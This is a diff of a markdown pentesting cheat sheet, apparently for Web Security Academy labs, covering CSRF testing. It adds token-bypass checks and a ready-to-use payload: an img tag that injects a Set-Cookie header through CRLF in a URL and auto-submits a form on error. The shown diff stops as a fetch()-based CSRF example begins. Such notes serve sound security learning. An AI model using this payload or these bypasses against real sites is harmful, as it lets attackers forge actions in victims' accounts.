@@ -241,15 +241,21 @@ Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
 ### :white_check_mark: Cross-site request forge (CSRF)
 _Burp suite extensions : CSRF Scanner_
 The extension is limited and does not perform many checks. Thus, the following should be tested :
-- Change method
+- Change HTTP method
+- Let the CSRF token as is
 - Remove CSRF token field
 - Remove CSRF token value
-- Let the CSRF token as is
+- Check if the token is based on a non session cookie (need to trigger a Set-Cookie in that case)
+
 
 #### Automated
 Find a request to CSRF, then right click : Engagement tool > Generate CRSF PoC. This produce a code sample that should can be exploited as is.
 
 #### Manual
+##### In a GET request
+```
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+```
 ##### CSRF using Javascript fetch()
 ```
 <html>
